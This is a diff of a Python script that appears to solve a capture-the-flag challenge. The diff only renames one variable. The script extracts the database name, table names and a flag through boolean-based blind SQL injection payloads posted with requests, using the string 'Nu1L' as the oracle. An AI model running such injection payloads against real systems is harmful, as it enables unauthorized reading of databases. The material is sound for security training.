@@ -8,8 +8,8 @@ def get_database(url,strings):
         data = {
             'id': "1&&(length(database()))="+str(i)
         }
-        rs = requests.post(url,data)
-        if 'Nu1L' in rs.text:
+        res = requests.post(url,data)
+        if 'Nu1L' in res.text:
             database_length = i
             print('数据库长度为：'+str(database_length))
             break
@@ -18,8 +18,8 @@ def get_database(url,strings):
             data = {
                 'id': "1&&substr(database()," + str(i) + ",1)='"+str(one_char)+"'"
             }
-            rs = requests.post(url,data)
-            if 'Nu1L' in rs.text:
+            res = requests.post(url,data)
+            if 'Nu1L' in res.text:
                 DBname = DBname + one_char
                 print("\r", end="")
                 print('正在获取数据库名称，当前已获取到'+str(i)+'位 | '+DBname.lower(), end='')
@@ -35,8 +35,8 @@ def get_tablename(url,strings):
                     i) + ",1)='"+str(one_char)+"'"
             }
             time.sleep(0.05)
-            rs = requests.post(url,data)
-            if 'Nu1L' in rs.text:
+            res = requests.post(url,data)
+            if 'Nu1L' in res.text:
                 TBname = TBname + one_char
                 print("\r", end="")
                 print('表的名字为：' + TBname.lower(), end='')
@@ -55,10 +55,10 @@ def get_column(url,strings):
                'id':"1&&((select 1,'"+str(one_char)+"') > (select * from f1ag_1s_h3r3_hhhhh))"
             }
             time.sleep(0.05)
-            rs = requests.post(url,data)
-            if 'Nu1L' not in rs.text:
+            res = requests.post(url,data)
+            if 'Nu1L' not in res.text:
                 tmp = one_char
-            if 'Nu1L' in rs.text:
+            if 'Nu1L' in res.text:
                 column_name = tmp
                 print("\r", end="")
                 print('flag为：' + column_name.lower(), end='')
